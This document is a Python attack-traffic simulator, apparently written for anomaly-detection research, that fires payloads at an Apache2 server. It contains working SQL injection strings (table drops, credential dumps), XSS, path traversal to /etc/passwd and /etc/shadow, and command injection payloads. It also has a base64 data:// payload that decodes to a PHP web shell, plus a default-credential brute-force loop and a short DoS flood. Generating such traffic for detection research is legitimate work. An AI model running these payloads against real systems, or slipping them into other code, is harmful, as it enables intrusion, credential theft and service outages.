#!/usr/bin/env python3
"""
Attack Traffic Simulator for Apache2 - Digital Twin Anomaly Detection
This script generates various attack patterns against an Apache2 server
for anomaly detection research.
"""

import requests
import random
import time
import threading
import argparse
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
	#logging.FileHandler("anomaly_traffic.log"),
        logging.StreamHandler()
    ]
)

class AttackSimulator:
    def __init__(self, target_url, num_threads=3):
        self.target_url = target_url
        self.num_threads = num_threads
        self.running = False
        self.executor = None
        
        # Common user agents for masking attacks
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "curl/7.68.0",
            "Wget/1.20.3 (linux-gnu)"
        ]
        
        # SQL Injection attack patterns
        self.sql_injection_payloads = [
            "' OR 1=1 --",
            "' OR '1'='1",
            "admin' --",
            "1'; DROP TABLE users; --",
            "1' UNION SELECT username, password FROM users --",
            "' OR 1=1 LIMIT 1; --",
            "' OR '1'='1' LIMIT 1; --",
            "' OR 1=1; DROP TABLE users; --",
            "' AND 1=0 UNION ALL SELECT 1,2,3,4,5,6,7,8,9 --",
            "' AND 1=0 UNION ALL SELECT null,null,null,null,null,null,concat(username,0x3a,password),null,null FROM users --"
        ]
        
        # XSS attack patterns
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src='x' onerror='alert(\"XSS\")'>",
            "<body onload='alert(\"XSS\")'>",
            "<svg/onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";"
            + "alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--"
            + "></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            "<div style=\"background-image: url(javascript:alert('XSS'))\">",
            "<a href=\"javascript:alert('XSS')\">Click me</a>",
            "<input type=\"text\" value=\"\" onfocus=\"alert('XSS')\" autofocus>",
            "<marquee onstart='alert(\"XSS\")'>"
        ]
        
        # Path traversal attack patterns
        self.path_traversal_payloads = [
            "../../../etc/passwd",
            "../../../../etc/shadow",
            "../../../../../../../etc/passwd",
            "../../../../../../windows/win.ini",
            "..%2f..%2f..%2fetc%2fpasswd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "..\\..\\..\\windows\\win.ini",
            "..%5c..%5c..%5cwindows%5cwin.ini",
            "/etc/passwd",
            "file:///etc/passwd"
        ]
        
        # Command injection attack patterns
        self.command_injection_payloads = [
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& cat /etc/passwd",
            "; id",
            "| id",
            "& id",
            "; ls -la",
            "| ls -la",
            "& ls -la",
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`"
        ]

    def simulate_sql_injection(self):
        """Simulate SQL injection attacks"""
        params = {
            "id": random.choice(self.sql_injection_payloads),
            "username": random.choice(self.sql_injection_payloads),
            "password": random.choice(self.sql_injection_payloads),
            "search": random.choice(self.sql_injection_payloads)
        }
        
        # Choose random parameter
        param_name = random.choice(list(params.keys()))
        param_value = params[param_name]
        
        # Create request parameters
        request_params = {param_name: param_value}
        
        # Choose random endpoint
        endpoints = ["/login", "/search", "/product", "/user", "/admin"]
        endpoint = random.choice(endpoints)
        
        url = f"{self.target_url}{endpoint}"
        headers = {"User-Agent": random.choice(self.user_agents)}
        
        try:
            logging.info(f"SQL Injection attack: GET {url} with param {param_name}={param_value}")
            response = requests.get(url, params=request_params, headers=headers, timeout=10)
            logging.info(f"Response: {response.status_code}")
        except Exception as e:
            logging.error(f"Error in SQL injection attack: {str(e)}")

    def simulate_xss_attack(self):
        """Simulate Cross-Site Scripting (XSS) attacks"""
        params = {
            "comment": random.choice(self.xss_payloads),
            "name": random.choice(self.xss_payloads),
            "search": random.choice(self.xss_payloads),
            "message": random.choice(self.xss_payloads)
        }
        
        # Choose random parameter
        param_name = random.choice(list(params.keys()))
        param_value = params[param_name]
        
        # Create request parameters
        request_params = {param_name: param_value}
        
        # Choose random endpoint
        endpoints = ["/comment", "/guestbook", "/search", "/feedback", "/profile"]
        endpoint = random.choice(endpoints)
        
        url = f"{self.target_url}{endpoint}"
        headers = {"User-Agent": random.choice(self.user_agents)}
        
        try:
            logging.info(f"XSS attack: GET {url} with param {param_name}={param_value}")
            response = requests.get(url, params=request_params, headers=headers, timeout=10)
            logging.info(f"Response: {response.status_code}")
        except Exception as e:
            logging.error(f"Error in XSS attack: {str(e)}")
            
        # Also try a POST request for XSS
        try:
            logging.info(f"XSS attack: POST {url} with param {param_name}={param_value}")
            response = requests.post(url, data={param_name: param_value}, headers=headers, timeout=10)
            logging.info(f"Response: {response.status_code}")
        except Exception as e:
            logging.error(f"Error in XSS POST attack: {str(e)}")

    def simulate_path_traversal(self):
        """Simulate Path Traversal attacks"""
        # Choose random payload
        payload = random.choice(self.path_traversal_payloads)
        
        # Choose random parameter
        param_names = ["file", "page", "document", "path", "include"]
        param_name = random.choice(param_names)
        
        # Create request parameters
        request_params = {param_name: payload}
        
        # Choose random endpoint
        endpoints = ["/download", "/view", "/file", "/include", "/read"]
        endpoint = random.choice(endpoints)
        
        url = f"{self.target_url}{endpoint}"
        headers = {"User-Agent": random.choice(self.user_agents)}
        
        try:
            logging.info(f"Path Traversal attack: GET {url} with param {param_name}={payload}")
            response = requests.get(url, params=request_params, headers=headers, timeout=10)
            logging.info(f"Response: {response.status_code}")
        except Exception as e:
            logging.error(f"Error in Path Traversal attack: {str(e)}")
            
        # Also try direct URL
        try:
            direct_url = f"{self.target_url}{endpoint}/{payload}"
            logging.info(f"Path Traversal attack: Direct GET {direct_url}")
            response = requests.get(direct_url, headers=headers, timeout=10)
            logging.info(f"Response: {response.status_code}")
        except Exception as e:
            logging.error(f"Error in direct Path Traversal attack: {str(e)}")

    def simulate_command_injection(self):
        """Simulate Command Injection attacks"""
        # Choose random payload
        payload = random.choice(self.command_injection_payloads)
        
        # Choose random parameter
        param_names = ["cmd", "exec", "command", "ping", "action"]
        param_name = random.choice(param_names)
        
        # Create request parameters
        request_params = {param_name: payload}
        
        # Choose random endpoint
        endpoints = ["/execute", "/ping", "/run", "/tool", "/utility"]
        endpoint = random.choice(endpoints)
        
        url = f"{self.target_url}{endpoint}"
        headers = {"User-Agent": random.choice(self.user_agents)}
        
        try:
            logging.info(f"Command Injection attack: GET {url} with param {param_name}={payload}")
            response = requests.get(url, params=request_params, headers=headers, timeout=10)
            logging.info(f"Response: {response.status_code}")
        except Exception as e:
            logging.error(f"Error in Command Injection attack: {str(e)}")
            
        # Also try POST request
        try:
            logging.info(f"Command Injection attack: POST {url} with param {param_name}={payload}")
            response = requests.post(url, data={param_name: payload}, headers=headers, timeout=10)
            logging.info(f"Response: {response.status_code}")
        except Exception as e:
            logging.error(f"Error in Command Injection POST attack: {str(e)}")

    def simulate_dos_attack(self, duration=5, requests_per_second=50):
        """Simulate a brief Denial of Service (DoS) attack"""
        url = f"{self.target_url}/"
        headers = {"User-Agent": random.choice(self.user_agents)}
        
        logging.info(f"Starting DoS attack simulation: {requests_per_second} req/s for {duration} seconds")
        
        end_time = time.time() + duration
        
        # Create a thread pool
        with ThreadPoolExecutor(max_workers=min(30, requests_per_second)) as executor:
            while time.time() < end_time:
                # Submit multiple requests simultaneously
                futures = []
                for _ in range(requests_per_second):
                    futures.append(executor.submit(requests.get, url, headers=headers, timeout=1))
                
                # Small delay to avoid CPU hogging
                time.sleep(0.1)
        
        logging.info("DoS attack simulation completed")

    def simulate_brute_force(self, attempts=20):
        """Simulate a brute force login attack"""
        url = f"{self.target_url}/login"
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        # Common usernames to try
        usernames = ["admin", "administrator", "root", "user", "webmaster", "support", "test", "demo"]
        
        # Common passwords to try
        passwords = [
            "password", "123456", "admin", "welcome", "password123", 
            "qwerty", "123456789", "12345678", "111111", "1234567890"
        ]
        
        logging.info(f"Starting brute force attack simulation on {url} with {attempts} attempts")
        
        for _ in range(attempts):
            username = random.choice(usernames)
            password = random.choice(passwords)
            
            data = {
                "username": username,
                "password": password,
                "submit": "Login"
            }
            
            try:
                response = requests.post(url, data=data, headers=headers, timeout=10)
                logging.info(f"Brute force attempt: {username}:{password} - Status: {response.status_code}")
                
                # Add small delay between attempts
                time.sleep(random.uniform(0.1, 0.5))
            except Exception as e:
                logging.error(f"Error in brute force attempt: {str(e)}")
        
        logging.info("Brute force attack simulation completed")

    def simulate_lfi_attack(self):
        """Simulate Local File Inclusion (LFI) attacks"""
        # Common LFI payloads
        lfi_payloads = [
            "/etc/passwd",
            "/etc/hosts",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/proc/self/cmdline",
            "/proc/self/status",
            "C:\\Windows\\system32\\drivers\\etc\\hosts",
            "C:\\Windows\\win.ini",
            "C:\\boot.ini"
        ]
        
        # Choose random parameter
        param_names = ["page", "file", "include", "path", "doc"]
        param_name = random.choice(param_names)
        
        # Choose random payload
        payload = random.choice(lfi_payloads)
        
        # Create different payloads with path traversal
        traversal_patterns = [
            payload,
            f"../{payload}",
            f"../../{payload}",
            f"../../../{payload}",
            f"....//....//....//....//....//....//....//....//....//....//....//..../{payload}",
            f"php://filter/convert.base64-encode/resource={payload}",
            f"php://input",
            f"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="
        ]
        
        # Choose a traversal pattern
        final_payload = random.choice(traversal_patterns)
        
        # Create request parameters
        request_params = {param_name: final_payload}
        
        # Choose random endpoint
        endpoints = ["/index.php", "/page.php", "/main.php", "/include.php", "/view.php"]
        endpoint = random.choice(endpoints)
        
        url = f"{self.target_url}{endpoint}"
        headers = {"User-Agent": random.choice(self.user_agents)}
        
        try:
            logging.info(f"LFI attack: GET {url} with param {param_name}={final_payload}")
            response = requests.get(url, params=request_params, headers=headers, timeout=10)
            logging.info(f"Response: {response.status_code}")
        except Exception as e:
            logging.error(f"Error in LFI attack: {str(e)}")

    def worker(self):
        """Worker function to run different attack simulations"""
        attack_types = [
            self.simulate_sql_injection,
            self.simulate_xss_attack,
            self.simulate_path_traversal,
            self.simulate_command_injection,
            self.simulate_lfi_attack,
            self.simulate_brute_force
        ]
        
        while self.running:
            # Select random attack type
            attack_function = random.choice(attack_types)
            
            # Execute the attack
            attack_function()
            
            # Occasionally simulate a DoS attack (5% chance)
            if random.random() < 0.05:
                self.simulate_dos_attack(
                    duration=random.randint(3, 5),
                    requests_per_second=random.randint(20, 40)
                )
            
            # Random delay between attacks
            time.sleep(random.uniform(1.0, 5.0))

    def start(self, duration=300):
        """Start the attack simulator for a specified duration"""
        if self.running:
            logging.warning("Attack simulator is already running")
            return
        
        self.running = True
        self.executor = ThreadPoolExecutor(max_workers=self.num_threads)
        
        logging.info(f"Starting attack simulator with {self.num_threads} threads")
        logging.info(f"Target URL: {self.target_url}")
        logging.info(f"Duration: {duration} seconds")
        
        # Submit worker tasks to the executor
        futures = []
        for _ in range(self.num_threads):
            futures.append(self.executor.submit(self.worker))
        
        # Wait for the specified duration
        time.sleep(duration)
        
        # Stop the simulator
        self.stop()
        
        logging.info("Attack simulator completed")

    def stop(self):
        """Stop the attack simulator"""
        if not self.running:
            logging.warning("Attack simulator is not running")
            return
        
        self.running = False
        
        if self.executor:
            self.executor.shutdown(wait=False)
            self.executor = None
            
        logging.info("Attack simulator stopped")


def main():
    parser = argparse.ArgumentParser(description="Attack Traffic Simulator for Apache2 Server")
    parser.add_argument("--url", default="http://localhost", help="Target URL (default: http://localhost)")
    parser.add_argument("--threads", type=int, default=3, help="Number of worker threads (default: 3)")
    parser.add_argument("--duration", type=int, default=300, help="Duration to run in seconds (default: 300)")
    
    args = parser.parse_args()
    
    simulator = AttackSimulator(
        target_url=args.url,
        num_threads=args.threads
    )
    
    try:
        simulator.start(duration=args.duration)
    except KeyboardInterrupt:
        logging.info("Keyboard interrupt received")
        simulator.stop()
    except Exception as e:
        logging.error(f"Unexpected error: {str(e)}")
        simulator.stop()


if __name__ == "__main__":
    main()
